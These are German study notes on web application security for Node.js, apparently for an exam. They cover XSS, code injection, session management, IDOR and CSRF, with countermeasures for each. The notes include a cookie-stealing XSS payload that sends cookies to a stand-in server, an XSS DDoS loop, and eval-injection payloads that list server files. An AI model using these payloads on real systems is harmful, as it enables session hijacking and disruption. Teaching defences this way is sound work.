# Web Security

Motivation für Websecurity:

* Imageverlust, rechtliche Folgen/Haftung
* Später Einbau von Sicherheit ist aufwändig und unsicher

Vulnerability
: Angriffsmöglichkeit

Angriff / Attack Vector
: Details/Schritte einer Angriffsmöglichkeit

Malitious Code
: Angriffs-Code, Schadcode

Injection Attack
: Angriff bei dem einem System Code zur Ausführung untergeschoben wird

XSS
: Cross Site Scripting. Eine Angriffsmethode bei der in einer Web-Seite im Browser des Opfers eingeschleustes JavaScript zur ausgeführt wird. XSS würden besser als “JavaScript Browser Injection“ Attacken bezeichnet werden.

## Cross-Site-Scripting (XSS)
> drei wirksame Massnahmen,um Webapp abzusichern
> → Umsetzen können: PRÜFUNG?!

Bei XSS wird der Server Server bzw. die Daten des Servers so manupuliert, dass Schadcode (JavaScript) eines Angreifers an Nutzer (Opfer) ausgeliefert wird und im Browser dieser Nutzer ausgeführt wird.

### Beispiel

Von Nutzern in einem Formular eingegebene Daten werden ohne "escaping"/Nachbereitung an andere Nutzer ausgeliefert - beispielsweise alle Username in Admin-Konsole.

Folgender Input sendet das cookie der aktuellen seite an einen anderen Server.

```html
fakeUser<script>document.body.innerHTML +=
    '<img src="http://localhost:8081/?cookie='
    + escape(document.cookie) + '">';</script>
```

Der Angreiffer bekommt nun das Cookie und kann mit dem die Session übernehmen:
```js
document.cookie = unescape(cookie);
```

Mit XSS wäre auch ein DDos Angriff möglich
```html
<script>function ddos(){
    document.body.innerHTML += <img src="http://path-to-vulnerable-resource/">;
    setTimeout(function(){ddos()}, 2000)};
    ddos();
</script>
```

### Gegenmassnahmen
* Kontext-sensitives Data Encoding aka. "escaping". bzw. Input Validierung bei der Entgegennahme der Daten
* Content Security Policy (CSP) im Header setzen: z.B. nur die Source Domain und eine REST Service darf kontaktiert werden.
* Bei Cookies soweit möglich das HTTPOnly Flag setzen

```js
app.use(express.session({
    secret: "server secret",
    key: "sessionId",
    cookie: {
        httpOnly: true,
        secure: true
    }
}))
```

!!! todo

    Evtl [konkrete escaping Tabelle](http://nodegoat.herokuapp.com/tutorial/a3) einbinden

→ Verbesserung des Encodings / Filtering

## JS Code Injection
Angreifer kann den Server dazu bringen, vom Angreifer eingeschleuster code Auszuführen. Bei Node ist das JavaScript - könnte in anderem Kontext aber bsp. Python oder PHP Code sein.

### Beispiel
```js
// Insecure use of eval() to parse inputs
var preTax = eval(req.body.preTax);

// Geht aber auch mit setTimeout, setInterval
window.setTimeout("alert('Hello World!');", 500);
// und new Function
new Function("return x;");
```

Mögliche Möglicher Angriff

```js
while(true){/*Loop forever*/}
```

```js
res.end(require('fs').readdirSync('.').toString())
```

### Gegenmassnahmnen

* EVAL ist EVIL.
* `parseInt` und `JSON.parse` verwenden.
* Globale Scopes und Variablen reduzieren.
* Rechenintensive Tasks mit `childprocess.spawn` auslagern
* Node nicht als Root
* `x-powered-by` Header abstellen. `app.disable('x-powered-by');`

## Broken Authentication and Session Management

Bei Problemen bei der Authentisierung und dem Session Management können externe Angreifer oder **Angreifer** mit einem validen Login **auf Informationen zugreifen welche nicht für sie bestimmt sind**.

### Beispiele
* Passwort oder Token wird nicht verschlüsselt übertragen (Unabhängig  GET/POST) → Mit Sniffer auslesbar.
* Session Timeout ist zu lang
* Kennwörter unverschlüsselt in DB

### Gegenmassnahmen
* HTTPS Nutzen
* Session Timeout für sensible Daten und Operationen sinnvoll setzen.
* Kennwörter verschlüsselt in DB

## Insecure Direct Object References

Wenn eine Referenz auf ein intern implementiertes Objekt (Bsp. Datei, Verzeichnis oder DB-Key). Ohne Zugriffskontrolle oder andere Schutzmechanismen kann der Angreiffer über diese Referenzen unberechtigte Daten verändern.

### Beispiel
User ID nur in URL codiert `www.retureEasy.com/stockportfolio/:userId`, aber auf der Seite wird nicht geprüft, ob der Aktuelle user auch diese ID hat.

### Gegenmassnahmen
Bei alle Seiten mit benutzerspezifischen Daten vor der Anzeige sicher stellen, dass der eingeloggte User berechtigt ist, die Daten zu sehen/bearbeiten.

In Node können solche Checks mittels Middlewares implementiert werden.

```js
function requireLogin(req, res, next) {
    if (typeof(req.session.user_id) == "number") {
        next();
    } else {
        res.send(401, 'not authorized');
    }
}
```

## Cross Site Request Forgery
Eine CSRF Attacke zwingt den Browser des Opfers, einen gefälschten HTTP request (inklusive dessen Session-Cookie und anderen Authentifizierungsdaten) an einen verwundbaren webserver zu senden. Dies ermöglicht dem Angreiffer. Damit kann der Angreiffer über den Browser des Opfers ANfragen auf die verwundbare Appliatkion ausführen.


### Beispiele
Der Nutzer ist aktuell bei RetireEasy eingelogged, er wird aber (z.B. über einem Link in einem E- Mail) auf eine Seite mit Schadcode gelockt. Diese Seite generiert einen Formular-Post-Request auf die RetireEasy/profile Seite mit gefälschten Daten für das Profil.

### Gegenmassnahmen
* Generieren von server-seigigen Security Tokens.
* Einbetten in Formular (Hidden fields)
* Prüfen bei Request

## Top Overlooked Security Threats To NodeJS Web Applications

* Enable CSRF Protection
    * Cross Site Request Forgery

    ```js
    app.use(express.csrf());

    app.use(function(req, res, next) {
        res.locals.csrftoken = req.csrfToken();
        next();
    });
    ```

    ```
    <input type="hidden" name="_csrf" value="{{csrftoken}}" />
    ```

    * Problem: Express CSRF middleware ignoreirt  GET, Option und HEAD requests → Was ja gut ist, aber man muss sichertellen, dass GET kein mutable state verursacht.

* Preventing Internal implementation disclosure
    * Response headers (Bsp. `X-Powered-By: Express`) nicht sensen (`app.disable("x-powered-y")`)
    * Auch session keys können infos leaken.
* Cross Site Scripting
    * Allows attacker to execute code in victims browser
        * Force redrects to malicious sites
        * access cookies, session tokes or sensitive information
    * Template libraries with automagic escaping don't solve te problem entierly!
    * Different encoding logic depending on where (eg. links require different encoding)
    * Don't forget data in the URL (eg. in Hash or ther query parameters!)
    * Secure cookie: With `httpOnly` (can't be accessed from JS in Browser) and `secure` (https only)
    * Add content security policy header
* HTTP Prameter Pollution
    * Multiple paramters with the same name → array! (eg. `req.body.firstname`)
    * Generates Type erros -> uncaught errors in async code could crash the http server (DoS)!
    * If passed directly into a DB: Modify application behaviour or bypass validation (eg. `['foo', 'baa'] + 'x'` macht js stillschweigend zu `'foo,baax'`)
    * Fix: Typecheck, test with input fuzzing, robust error handling
* Regular Expressions DoS
    * Can take exponential execution time for specific inputs.
    * Fix: Review regexes!


!!! seealso

    * http://nodegoat.herokuapp.com/tutorial
    * https://blog.risingstack.com/node-js-security-checklist/
